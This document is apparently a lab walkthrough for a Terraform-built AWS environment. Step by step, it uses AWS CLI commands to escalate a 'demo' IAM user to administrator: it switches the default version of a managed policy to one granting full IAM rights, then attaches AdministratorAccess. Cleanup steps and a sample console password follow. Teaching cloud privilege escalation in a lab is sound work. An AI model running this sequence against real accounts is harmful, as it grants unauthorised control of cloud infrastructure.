# Solutions / Walk through

Lets start off by viewing what permissions are attached to our user.

Run the following commands while authenticated as demo.

```sh
aws iam list-attached-user-policies --user-name demo

aws iam list-user-policies --user-name demo
```

The first command lists existing policies managed by aws and your account. While the seconds lists inline policies that only exist for the object they are attached too.

Lets look into the following policies changePolicyVersion and developerPermissions.

Replace **ACCOUNT_ID** in all following commands with the 12 digit account id you got from your terraform output.

```sh
aws iam get-user-policy --user-name demo --policy-name changePolicyVersion

aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developerPermissions
```

It looks like we have access to change policy versions and the developerPermissions seems to have several versions.

Lets list the versions and look at the different version permissionns.

```sh
aws iam list-policy-versions --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developerPermissions

aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developerPermissions --version-id v2

aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developerPermissions --version-id v1
```

It looks like the **v1** policy grants us full iam permissions, lets change the policy to use it as the default policy version.

```sh
aws iam set-default-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/developerPermissions --version-id v1
```

Our user now has full iam permissions, lets give ourself administrative permissions.

```sh
aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name demo

aws iam list-attached-user-policies --user-name demo
```

The demo user now has administrator permissions in this aws account. ◻

## Cleanup

Lets remove the policies we attached and then let terraform do the rest.

```sh
aws iam detach-user-policy --user-name demo --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## AWS Console

All of the following can be done in the web console as well.

Run the following command.

```sh
aws iam create-login-profile --user-name demo --password 'My!User1Login8P@ssword'
```

Navigate to [console.aws.amazon.com](console.aws.amazon.com) choose IAM login, account id is in the terraform output [*account_id*], username is **demo** and password is **My!User1Login8P@ssword**
